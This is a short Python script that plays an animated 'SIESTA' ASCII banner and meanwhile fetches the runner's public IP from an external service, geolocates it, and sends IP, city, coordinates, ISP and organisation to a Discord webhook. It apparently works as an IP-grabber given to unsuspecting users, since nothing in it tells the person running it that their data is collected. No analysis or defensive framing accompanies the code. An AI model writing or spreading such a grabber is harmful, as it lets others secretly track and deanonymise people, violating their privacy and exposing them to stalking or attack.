from dhooks import Webhook, Embed
from datetime import datetime
from pystyle import *
from os import system, name
import os
import requests
import json

def clear():
    system("cls" if name == "nt" else "clear")



if name == "nt":
    system("title S I E S T A & mode 150, 40")


banner = """



   ▄▄▄▄▄   ▄█ ▄███▄     ▄▄▄▄▄      ▄▄▄▄▀ ██   
  █     ▀▄ ██ █▀   ▀   █     ▀▄ ▀▀▀ █    █ █  
▄  ▀▀▀▀▄   ██ ██▄▄   ▄  ▀▀▀▀▄       █    █▄▄█ 
 ▀▄▄▄▄▀    ▐█ █▄   ▄▀ ▀▄▄▄▄▀       █     █  █ 
            ▐ ▀███▀               ▀         █ 
                                           █  
                                          ▀   


"""    

Anime.Fade(Center.Center(banner), Colors.red_to_yellow, Colorate.Vertical, interval=0.025, enter=True)



hook = Webhook("")

time = datetime.now().strftime("%H:%M %p")  
ip = requests.get('https://api.ipify.org/').text

r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
geo = r.json()
embed = Embed()
fields = [
    {'name': 'IP', 'value': geo['query']},
    {'name': 'ipType', 'value': geo['ipType']},
    {'name': 'Country', 'value': geo['country']},
    {'name': 'City', 'value': geo['city']},
    {'name': 'Continent', 'value': geo['continent']},
    {'name': 'Country', 'value': geo['country']},
    {'name': 'IPName', 'value': geo['ipName']},
    {'name': 'ISP', 'value': geo['isp']},
    {'name': 'Latitute', 'value': geo['lat']},
    {'name': 'Longitude', 'value': geo['lon']},
    {'name': 'Org', 'value': geo['org']},
    {'name': 'Region', 'value': geo['region']},
    {'name': 'Status', 'value': geo['status']},
]
for field in fields:
    if field['value']:
        embed.add_field(name=field['name'], value=field['value'], inline=True)
hook.send(embed=embed)

